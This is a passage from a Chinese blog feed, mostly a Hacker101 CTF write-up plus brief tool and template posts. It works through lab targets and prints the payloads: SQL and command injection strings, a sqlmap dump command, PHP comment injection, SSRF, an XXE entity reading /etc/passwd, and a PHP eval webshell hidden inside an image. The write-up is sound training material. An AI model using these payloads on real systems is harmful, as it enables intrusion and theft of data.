string">'/fetch'</span><span class="token punctuation">)</span><span class="token number">65</span> <span class="token keyword">def</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token number">66</span>     cur <span class="token operator">=</span> getDb<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token number">67</span>     <span class="token comment">#这里存在注入。我们可以控制request.args['id']达到控制sql过程</span><span class="token number">68</span>     <span class="token keyword">if</span> cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'SELECT filename FROM photos WHERE id=%s'</span> <span class="token operator">%</span> request<span class="token punctuation">.</span>args<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span><span class="token number">69</span>         abort<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token number">70</span> <span class="token number">71</span>     <span class="token comment"># It's dangerous to go alone, take this:</span><span class="token number">72</span>     <span class="token comment"># ^FLAG^276c9cab4db9a0f361be2059933e1238ddac12c6b3c3ce867e736068284e9036$FLAG$</span><span class="token number">73</span>     <span class="token comment">#以只读的方式，读文件</span><span class="token number">74</span>     <span class="token keyword">return</span> <span class="token builtin">file</span><span class="token punctuation">(</span><span class="token string">'./%s'</span> <span class="token operator">%</span> cur<span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token number">75</span> <span class="token number">76</span> <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span><span class="token number">77</span>     app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span></code></pre><ol type="1"><li><p>控制 <code>fns=["xx || ls"]</code>： 命令注入</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#line 59</span>rep <span class="token operator">+=</span> <span class="token string">'&lt;i>Space used: '</span> <span class="token operator">+</span> subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token string">'du -ch %s || exit 0'</span> <span class="token operator">%</span> <span class="token string">' '</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'files/'</span> <span class="token operator">+</span> fn <span class="token keyword">for</span> fn <span class="token keyword">in</span> fns<span class="token punctuation">)</span><span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'&lt;/i>'</span></code></pre><ol type="1"><li><p><code>rep += ...</code>:这是一个字符串拼接操作，<code>rep</code>是一个字符串变量，通过<code>+=</code>操作符将后面的内容追加到该变量中。</p></li><li><p><code>'&lt;i&gt;Space used: '</code>:这是一个HTML标签<code>&lt;i&gt;</code>，用于表示斜体文本，后面跟着字符串"Space used: "。</p></li><li><p><code>subprocess.check_output(...)</code>:这是Python的<code>subprocess</code>模块，用于运行系统命令并获取其输出。在这里，它执行了一个<code>du</code>命令来计算指定目录的磁盘空间使用情况。</p></li><li><p><code>'du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns)</code>:这是一个命令字符串，<code>%s</code>是一个占位符，将由后面的<code>' '.join('files/' + fn for fn in fns)</code>所替换。<code>'files/' + fn for fn in fns</code>是一个列表生成式，将在每个文件名<code>fn</code>前添加"files/"，形成一个新的字符串列表，这些文件列表将传递给<code>du</code>命令来计算它们的磁盘空间使用情况。</p></li><li><p><code>shell=True</code>:这是告诉<code>subprocess.check_output()</code>在一个shell中执行命令，这样可以支持管道和其他shell特性。</p></li><li><p><code>stderr=subprocess.STDOUT</code>:这是将标准错误输出与标准输出合并，这样错误信息将显示在输出结果中，而不会产生异常。</p></li><li><p><code>.strip().rsplit('n', 1)[-1]</code>:这是对<code>subprocess.check_output()</code>返回的结果进行处理，首先通过<code>.strip()</code>方法去除输出结果中的空白字符，然后通过<code>.rsplit('n', 1)[-1]</code>将输出结果按照换行符分割，并取最后一个部分（最后一行）作为结果。</p></li><li><p><code>'&lt;/i&gt;'</code>:这是一个HTML结束标签，用于结束斜体文本的表示。综上所述，该代码段的目的是获取指定目录下文件的磁盘空间使用情况，并将结果以斜体文本的形式添加到<code>rep</code>字符串变量中。请注意，代码执行的前提是系统中有可用的<code>du</code>命令，并且<code>fns</code>变量包含了要统计空间使用情况的文件列表。</p></li></ol></li><li><p>控制<code>fns</code></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#50-55</span>        cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>        fns <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> pid<span class="token punctuation">,</span> ptitle<span class="token punctuation">,</span> pfn <span class="token keyword">in</span> cur<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            rep <span class="token operator">+=</span> <span class="token string">'&lt;div>&lt;img src="fetch?id=%i" width="266" height="150">&lt;br>%s&lt;/div>'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>pid<span class="token punctuation">,</span> sanitize<span class="token punctuation">(</span>ptitle<span class="token punctuation">)</span><span class="token punctuation">)</span>            fns<span class="token punctuation">.</span>append<span class="token punctuation">(</span>pfn<span class="token punctuation">)</span> </code></pre><p><strong>解析：</strong></p><ol type="1"><li><p><code>cur.execute(...)</code>:这是在Python中使用数据库的典型方式，<code>cur</code>是数据库的游标对象，它执行SQL查询。这里执行了一个<code>SELECT</code>查询，从名为"photos"的数据库表中选择指定"parent"值的记录，最多选择3条记录。"parent"值是通过占位符<code>%s</code> 指定的，它将由后面的<code>(id,)</code>所替换。</p></li><li><p><code>fns = []</code>:这是一个空列表，用于存储从数据库中检索到的文件名。</p></li><li><p><code>for pid, ptitle, pfn in cur.fetchall():</code>:这是对数据库查询结果进行迭代的循环，<code>cur.fetchall()</code>返回所有满足查询条件的结果行。在每次迭代中，<code>pid</code>表示照片的ID，<code>ptitle</code>表示照片的标题，<code>pfn</code>表示照片的文件名。</p></li><li><p><code>rep += ...</code>:这是字符串拼接操作，将HTML格式的照片信息添加到<code>rep</code>字符串变量中。</p></li><li><p><code>'&lt;div&gt;&lt;img src="fetch?id=%i" width="266" height="150"&gt;&lt;br&gt;%s&lt;/div&gt;' % (pid, sanitize(ptitle))</code>:这是一个HTML标签<code>&lt;div&gt;</code>，用于创建一个包含照片和标题的块。<code>&lt;img&gt;</code>标签用于显示照片，它的<code>src</code>属性是一个URL，指向一个用于获取照片内容的"fetch"服务，<code>%i</code>是一个占位符，将由后面的<code>pid</code>所替换，用于指定照片的ID。<code>width</code>和<code>height</code>属性指定照片的显示宽度和高度。<code>&lt;br&gt;</code>标签用于插入一个换行。<code>%s</code>是一个占位符，将由后面的<code>sanitize(ptitle)</code>所替换，用于显示经过处理的照片标题。</p></li><li><p><code>fns.append(pfn)</code>: 将每个照片的文件名 <code>pfn</code>添加到 <code>fns</code> 列表中，以便后续使用。综上所述，该代码段的目的是从数据库中选择指定"parent"值的照片记录，并将它们以HTML格式添加到<code>rep</code>字符串变量中。同时，也将照片的文件名添加到<code>fns</code>列表中，以供后续使用。</p></li></ol></li><li><p>fns的项来自表<code>photos中filename</code></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#line 65</span><span class="token keyword">def</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    cur <span class="token operator">=</span> getDb<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">#这里存在注入。我们可以控制request.args['id']达到控制sql过程</span>    <span class="token keyword">if</span> cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'SELECT filename FROM photos WHERE id=%s'</span> <span class="token operator">%</span> request<span class="token punctuation">.</span>args<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        abort<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span>    <span class="token comment"># It's dangerous to go alone, take this:</span>    <span class="token comment"># ^FLAG^276c9cab4db9a0f361be2059933e1238ddac12c6b3c3ce867e736068284e9036$FLAG$</span>    <span class="token comment">#以只读的方式，读文件</span>    <span class="token keyword">return</span> <span class="token builtin">file</span><span class="token punctuation">(</span><span class="token string">'./%s'</span> <span class="token operator">%</span> cur<span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><ul><li><code>python def fetch():     cur = getDb().cursor()</code> -定义了一个名为 <code>fetch</code> 的函数。</li><li>调用 <code>getDb()</code> 函数来获取数据库连接对象。</li><li>使用 <code>cursor()</code> 方法获取一个游标对象<code>cur</code>，用于执行SQL查询。</li><li><code>python     #这里存在注入。我们可以控制request.args['id']达到控制sql过程     if cur.execute('SELECT filename FROM photos WHERE id=%s' % request.args['id']) == 0:         abort(404)</code>-这是一个注释，指出代码存在SQL注入漏洞。因为在查询中使用了未经处理的用户输入<code>request.args['id']</code>。</li><li><code>cur.execute()</code> 执行SQL查询，使用 <code>%s</code>占位符来表示需要传递的参数，但是这里直接将用户输入<code>request.args['id']</code> 直接插入查询中，存在SQL注入的风险。</li><li>如果查询结果为空（即返回行数为0），则返回 HTTP 404 状态码（NotFound），终止执行。 <pre class="language-python" data-language="python"><div class="caption"><span># It's dangerous to go alone, take this:     # ^FLAG^276c9cab4db9a0f361be2059933e1238ddac12c6b3c3ce867e736068284e9036$FLAG$     #以只读的方式，读文件     return file('./%s' % cur.fetchone()[0].replace('..', ''), 'rb').read() ``` - 这部分是一个注释，注释中似乎包含一个名为 `FLAG` 的值。</span></div><code class="language-python">   <span class="token operator">-</span> 使用 `cur<span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>` 获取查询结果的第一行数据。   <span class="token operator">-</span> 使用 `<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>` 获取第一列数据（即 <span class="token string">"filename"</span> 列）。   <span class="token operator">-</span> 使用 `<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>` 来替换文件名中的 <span class="token string">".."</span>，这样可能是为了防止路径遍历攻击（path traversal attack）。   <span class="token operator">-</span> 使用 `<span class="token builtin">file</span><span class="token punctuation">(</span><span class="token punctuation">)</span>` 打开文件并返回文件内容。    请注意，这段代码存在SQL注入漏洞，攻击者可以通过 `<span class="token builtin">id</span>` 参数来控制SQL查询，从而执行任意数据库操作。而且代码中直接使用了过时的 `<span class="token builtin">file</span><span class="token punctuation">(</span><span class="token punctuation">)</span>` 函数来打开文件，建议使用 `<span class="token builtin">open</span><span class="token punctuation">(</span><span class="token punctuation">)</span>` 函数来代替。为了修复这个漏洞，应该使用参数化查询来处理SQL查询，避免直接插入用户输入数据。同时，建议更新代码中的文件操作以避免潜在的安全问题。<span class="token number">4.</span> 如果execute函数支持<span class="token operator">**</span>sql堆叠查询<span class="token operator">**</span>，就可以控制表photos中的数据了<span class="token punctuation">:</span>   ```sql   http<span class="token punctuation">:</span><span class="token operator">//</span>xxxx<span class="token operator">/</span>xxx<span class="token operator">/</span>fetch?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>update photos <span class="token builtin">set</span> title<span class="token operator">=</span><span class="token string">'test'</span> where <span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>commit<span class="token punctuation">;</span><span class="token operator">-</span><span class="token operator">-</span></code></pre></li></ul><p>返回主页查看效果</p></li><li><p>返回结果只有一行：</p><pre class="language-python" data-language="python"><code class="language-python">rep <span class="token operator">+=</span> <span class="token string">'&lt;i>Space used: '</span> <span class="token operator">+</span> subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token string">'du -ch %s || exit 0'</span> <span class="token operator">%</span> <span class="token string">' '</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'files/'</span> <span class="token operator">+</span> fn <span class="token keyword">for</span> fn <span class="token keyword">in</span> fns<span class="token punctuation">)</span><span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'&lt;/i>'</span></code></pre><ol type="1"><li><code>.strip().rsplit('n', 1)[-1]</code>: 这是对<code>subprocess.check_output()</code> 返回的结果进行处理，首先通过<code>.strip()</code> 方法去除输出结果中的空白字符，然后通过<code>.rsplit('n', 1)[-1]</code>将输出结果按照换行符分割，并取最后一个部分（最后一行）作为结果。</li></ol></li></ol></li><li><p>payload-1<imgsrc="https://s2.loli.net/2023/08/01/qsplEkjCD8Nc5uh.png"alt="image-20230801200536471" /></p></li><li><p>payload-2</p><ol type="1"><li><code>"xx ||ls|tr -t '\n' ':'"</code><ol type="1"><li><code>xx</code>:这是一个随意的占位符，攻击者可以在这里插入任意字符串，这里用<code>xx</code> 作为示例。</li><li><code>||</code>: 这是SQL中的逻辑或运算符，用来连接多个条件。</li><li><code>ls</code>:这是一个Linux/Unix系统上的命令，用于列出目录内容。</li><li><code>tr -t '\n' ':'</code>:这是一个Linux/Unix系统上的命令，用于将换行符 (<code>\n</code>)替换为冒号 (<code>:</code>)。</li></ol></li><li>result<img src="https://s2.loli.net/2023/08/01/AhnxljsP83iHmkf.png"alt="image-20230801200558610" /></li><li>获得3flag</li></ol></li></ol><h3 id="codys-first-blog">Cody's First Blog</h3><h4 id="flag1-1">flag1</h4><ol type="1"><li><p>提交评论</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span></code></pre></li><li><p>结果<img src="https://s2.loli.net/2023/08/03/Q9psAWmRu5x2OVl.png"alt="image-20230803034752590" /></p></li></ol><h4 id="flag2-1">flag2</h4><ol type="1"><li>目录扫描<imgsrc="https://s2.loli.net/2023/08/03/6uxOYTpiM2fVZmK.png"alt="image-20230803050357264" /></li><li>F12<imgsrc="https://s2.loli.net/2023/08/03/dCD5xTUiGu48wjk.png" /></li><li>去除auth再访问：<imgsrc="https://s2.loli.net/2023/08/03/Eyq1aAxGdto4mK6.png"alt="image-20230803035424214" /></li></ol><h4 id="flag3-1">flag3</h4><ol type="1"><li><p>SSRF</p><pre class="language-uri" data-language="uri"><code class="language-uri"><span class="token scheme">https<span class="token scheme-delimiter">:</span></span><span class="token authority"><span class="token authority-delimiter">//</span><span class="token host">4f8de2c9746af872bce2746c1e9669ad.ctf.hacker101.com</span></span><span class="token path"><span class="token path-separator">/</span></span><span class="token query"><span class="token query-delimiter">?</span><span class="token pair"><span class="token key">page</span>=<span class="token value">http://localhost/index</span></span></span></code></pre></li><li><p>评论</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span></code></pre></li><li><p>Approve comment<imgsrc="https://s2.loli.net/2023/08/03/XxWYVsak1tP7ATB.png"alt="image-20230803042802957" /></p></li><li><p>对这个页面F12<imgsrc="https://s2.loli.net/2023/08/03/s4rALJzIahK725d.png"alt="image-20230803042834435" /></p><figure><img src="https://s2.loli.net/2023/08/03/h7gkdXRN9emYqtM.png"alt="image-20230803042933856" /><figcaption aria-hidden="true">image-20230803042933856</figcaption></figure></li></ol><h3 id="postbook">Postbook</h3><h4 id="flag1-2">flag1</h4><ol type="1"><li>弱口令：<code>user;password</code>登录</li></ol><h4 id="flag2-2">flag2</h4><ol type="1"><li>没有参数2的页面</li><li>修改为2<img src="https://s2.loli.net/2023/08/03/izg2Xt8I7YO5Kha.png"alt="image-20230803050951044" /></li></ol><h4 id="flag3-2">flag3</h4><ol type="1"><li>write a new post,参数改为1<imgsrc="https://s2.loli.net/2023/08/03/rD4XI8FHUig5lk6.png"alt="image-20230803051418531" /></li></ol><h4 id="flag4">flag4</h4><ol type="1"><li><p>对<code>id</code>枚举</p><pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;d79ec0ecf0aba5b3e6b9c855f4fff50d.ctf.hacker101.com&#x2F;index.php?page&#x3D;view.php&amp;id&#x3D;945</code></pre></li><li><figure><img src="https://s2.loli.net/2023/08/03/625h1PEjlYmtySN.png"alt="image-20230803052255467" /><figcaption aria-hidden="true">image-20230803052255467</figcaption></figure></li><li><figure><img src="https://s2.loli.net/2023/08/03/Z5IPCj6rocqB1KQ.png"alt="image-20230803052312941" /><figcaption aria-hidden="true">image-20230803052312941</figcaption></figure></li></ol><h4 id="flag5">flag5</h4><ol type="1"><li><p>修改edit页面的id</p><pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;d79ec0ecf0aba5b3e6b9c855f4fff50d.ctf.hacker101.com&#x2F;index.php?page&#x3D;edit.php&amp;id&#x3D;1</code></pre></li></ol><h4 id="flag6">flag6</h4><ol type="1"><li><p>对cookie中的id破解<imgsrc="https://s2.loli.net/2023/08/03/ioWctaZvpFJqgLl.png"alt="image-20230803053637095" /><imgsrc="https://s2.loli.net/2023/08/03/cDWHvn4UkuVLY91.png"alt="image-20230803053646788" /></p></li><li><p>修改为1并md5加密，替换cookie<imgsrc="https://s2.loli.net/2023/08/03/b1el572vtNxdrgR.png"alt="image-20230803054317454" /></p><h4 id="flag7">flag7</h4><ol type="1"><li>delete同样是md5换值<imgsrc="https://s2.loli.net/2023/08/03/NcrDzXTO95Iqygl.png"alt="image-20230803054729466" /></li></ol></li></ol><h3 id="ticketastic-live-instance">Ticketastic: Live Instance</h3><h4 id="在这之前">在这之前</h4><ol type="1"><li><p>需要使用前一个demo测试<imgsrc="https://s2.loli.net/2023/08/06/mdRsB6HunMaFWo7.png"alt="image-20230806223036135" /></p></li><li><figure><img src="https://s2.loli.net/2023/08/06/QBnYINFwZ94Avdx.png"alt="image-20230806223049448" /><figcaption aria-hidden="true">image-20230806223049448</figcaption></figure></li><li><p>注意到create newuser功能<imgsrc="https://s2.loli.net/2023/08/06/YnwJ7se6hKPgVI4.png"alt="image-20230806223122843" /><imgsrc="https://s2.loli.net/2023/08/06/H9JEIT1xu32XKso.png"alt="image-20230806223349722" /></p></li></ol><h4 id="flag0">flag0</h4><ol type="1"><li><figure><img src="https://s2.loli.net/2023/08/06/OoDU7mZ6CqWNBgL.png"alt="image-20230806223458112" /><figcaption aria-hidden="true">image-20230806223458112</figcaption></figure></li><li>使用该账密登录，获得flag<imgsrc="https://s2.loli.net/2023/08/06/gZaDo8OFThENRIS.png" /></li></ol><h4 id="flag1-3">flag1</h4><ol type="1"><li><p>payload</p><pre class="language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">-u</span> <span class="token string">"https://f3b1b6bbcde35b672d9708deb6cc866d.ctf.hacker101.com/ticket?id=1"</span> <span class="token parameter variable">--dump</span> <span class="token parameter variable">--threads</span> <span class="token number">10</span> <span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">"session_level7b=eyJ1c2VyIjoidGVzdCJ9.F7ErIQ.88NEbDbh5vfOaU778uNKe_NgHUI"</span></code></pre><ol type="1"><li>cookie参数：因为到达该页面需要登录</li></ol></li><li><figure><img src="https://s2.loli.net/2023/08/06/LScfkadhrF8s1AJ.png"alt="image-20230806223914351" /><figcaption aria-hidden="true">image-20230806223914351</figcaption></figure></li></ol><h3 id="petshop-pro">Petshop Pro</h3><h4 id="flag0-1">flag0</h4><ol type="1"><li>改动购物车价格参数<imgsrc="https://s2.loli.net/2023/08/07/RDu49aWAyJoeSFi.png"alt="image-20230807004239403" /></li></ol><h4 id="flag1-4">flag1</h4><ol type="1"><li><p>子目录枚举<imgsrc="https://s2.loli.net/2023/08/07/lSZot4s1njdchJ5.png"alt="image-20230807004329679" /></p></li><li><p>登录页面账户、密码<strong>网上字典</strong>爆破</p><ol type="1"><li><ahref="https://github.com/jeanphorn/wordlist/blob/master/usernames.txt">用户名</a><imgsrc="https://s2.loli.net/2023/08/07/6d93wWuLBZfH1RD.png"alt="image-20230807004517805" /></li><li><figure><img src="https://s2.loli.net/2023/08/07/lcaE7KTu9hbdDsG.png"alt="image-20230807004532045" /><figcaption aria-hidden="true">image-20230807004532045</figcaption></figure></li><li><ahref="https://github.com/danielmiessler/SecLists/blob/master/Passwords/darkweb2017-top10000.txt">密码同理</a><imgsrc="https://s2.loli.net/2023/08/07/8t9DZTMN6ysgFJq.png"alt="image-20230807004614470" /></li><li>选择302请求登录<imgsrc="https://s2.loli.net/2023/08/07/BDeo6TPIbmcZGf5.png"alt="image-20230807004641582" /></li></ol></li></ol><h4 id="flag2-3">flag2</h4><ol type="1"><li>edit 页面xss<imgsrc="https://s2.loli.net/2023/08/07/UNpQ4FGyXqdEP7Z.png"alt="image-20230807004806423" /></li><li>返回购物车<imgsrc="https://s2.loli.net/2023/08/07/bEKhHR8S96jCIJx.png"alt="image-20230807004830326" /></li></ol><h3 id="model-e1337---rolling-code-lock">Model E1337 - Rolling CodeLock</h3><h4 id="flag0-2">flag0</h4><ol type="1"><li><p>目录爆破<imgsrc="https://s2.loli.net/2023/08/08/mcBV47a9htySlNK.png"alt="image-20230808022644116" /></p></li><li><p>F12:注释发现<code>get-config</code>文件<imgsrc="https://s2.loli.net/2023/08/08/B9MWlzUQc3s2Atp.png"alt="image-20230808022844619" /></p></li><li><p>尝试set-config存在（因为不是404）</p></li><li><p><code>OPTIONS</code>判断请求允许的参数<imgsrc="https://s2.loli.net/2023/08/08/B9MWlzUQc3s2Atp.png"alt="image-20230808023030684" /></p></li><li><p>爆破set-config的参数，得到<code>data</code><imgsrc="https://s2.loli.net/2023/08/08/zgIxHWjSdc8MRi6.png"alt="image-20230808023114428" /></p></li><li><p>XXE利用:payload url编码</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY xxe SYSTEM "/etc/passwd"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>config</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>location</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>location</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>config</span><span class="token punctuation">></span></span></code></pre><figure><img src="https://s2.loli.net/2023/08/08/TIpAEKmXzeUw7bc.png"alt="image-20230808023245300" /><figcaption aria-hidden="true">image-20230808023245300</figcaption></figure></li><li><p>将burp中的结果在浏览器展示失败（不知原因）</p><ol type="1"><li>刷新get-config或者admin页面<imgsrc="https://s2.loli.net/2023/08/08/yekCBGQKTJ1Humb.png"alt="image-20230808023518155" /></li></ol></li></ol><h4 id="flag1-5">flag1</h4><p>太难：代码审计<code>main.py</code> |<code>rng.py</code>,伪随机数生成原理</p><h3 id="tempimage">TempImage</h3><h4 id="flag0-3">flag0</h4><ol type="1"><li>更改请求字段文件名路径<imgsrc="https://s2.loli.net/2023/08/08/Nsk6nc5pTSJO2Pr.png"alt="image-20230808033136019" /></li></ol><h4 id="flag1-6">flag1</h4><ol type="1"><li><p>上传webshell(图片码)</p><ol type="1"><li><p>制作图片码，webshell.php:<code>&lt;?php @eval($_POST['hacker1'])?&gt;</code></p><pre class="language-bash" data-language="bash"><code class="language-bash">copy img.png/b + webshell.php shell.png</code></pre></li><li><p>上传到网上两级目录<imgsrc="https://s2.loli.net/2023/08/08/HKNZgslE3pPk7nV.png"alt="image-20230808033404645" /><imgsrc="https://s2.loli.net/2023/08/08/oIdx3OyZ45iGNjW.png"alt="image-20230808033421493" /></p></li></ol></li><li><p>中国蚁剑连接<imgsrc="https://s2.loli.net/2023/08/08/WUZTN5mGAlHcf3R.png"alt="image-20230808033523963" /></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Cybersecurity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>恶意代码分析环境</title>
      <link href="/2023/03/22/pma05/"/>
      <url>/2023/03/22/pma05/</url>
      
        <content type="html"><![CDATA[<h3 id="tool-list">Tool list</h3><ul><li>Dependency walker</li><li>Peid</li><li>BinText</li></ul><h3 id="系统">系统</h3><ul><li>Win7 专业版（Next Itell you）</li><li>激活码：Google 搜索B站</li></ul>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Binary exploition </tag>
            
            <tag> Reverse engineering </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CopyTranslator</title>
      <link href="/2023/03/08/copytranaslator/"/>
      <url>/2023/03/08/copytranaslator/</url>
      
        <content type="html"><![CDATA[<h4 id="图片翻译">图片翻译</h4><ul><li><p>下面的ocr识别的不精准</p></li><li><p><ahref="https://copytranslator.github.io/changelogs/v10.html#v10-1-0">参考</a></p></li><li><p>下载<ahref="https://github.com/CopyTranslator/CopyTranslator/releases/download/v10.1.0/CopyTranslator-PaddleOCR-json.v1.2.1.7z">CopyTranslator-PaddleOCR-json.v1.2.1.7z(opens new window)</a></p><ul><li>解压</li></ul></li><li><p>copyTranslator配置<imgsrc="https://s2.loli.net/2023/03/07/OsR93cX4qh187ie.png"alt="image-20230307221555353" /></p></li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Language </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Post-template</title>
      <link href="/2023/03/08/post-template/"/>
      <url>/2023/03/08/post-template/</url>
      
        <content type="html"><![CDATA[<h4 id="yaml">Yaml</h4><ul><li><p>yaml</p><pre class="language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">title</span><span class="token punctuation">:</span> Matrix Theory<span class="token key atrule">img</span><span class="token punctuation">:</span><span class="token key atrule">top</span><span class="token punctuation">:</span><span class="token key atrule">cover</span><span class="token punctuation">:</span><span class="token key atrule">coverImg</span><span class="token punctuation">:</span><span class="token key atrule">password</span><span class="token punctuation">:</span><span class="token key atrule">toc</span><span class="token punctuation">:</span> <span class="token boolean important">true</span><span class="token key atrule">mathjax</span><span class="token punctuation">:</span> <span class="token boolean important">true</span><span class="token key atrule">summary</span><span class="token punctuation">:</span> 研究生课程<span class="token punctuation">-</span>矩阵论<span class="token key atrule">categories</span><span class="token punctuation">:</span> Math<span class="token comment">#Technique 、 Life 、 Notes 、 Tools 、Linux 、Leetcode、OS、Programming Design、Database、Cybersecurity、Machine Learning、Academic、Resource、Game Development、Tip、Project|Game|Lab|Math</span><span class="token key atrule">tags</span><span class="token punctuation">:</span>  <span class="token comment">#Hexo、Sql、Blue、Game Development、虚幻4、基础、核心、Web、VMware、Task、File、Language、#Binary exploition、Reverse engineering、C++、Python 、Easygoing 、VMware、CTF、Vscode、Json、#Academic、Lab、Windows、AIGC、Xss、php、File Upload、STL、ppt、Computer Network、 OS|Miscellaneous|Docker|Paper|Sekiro|WindTerm|Crypto|Java|Static-Analysis</span> <span class="token 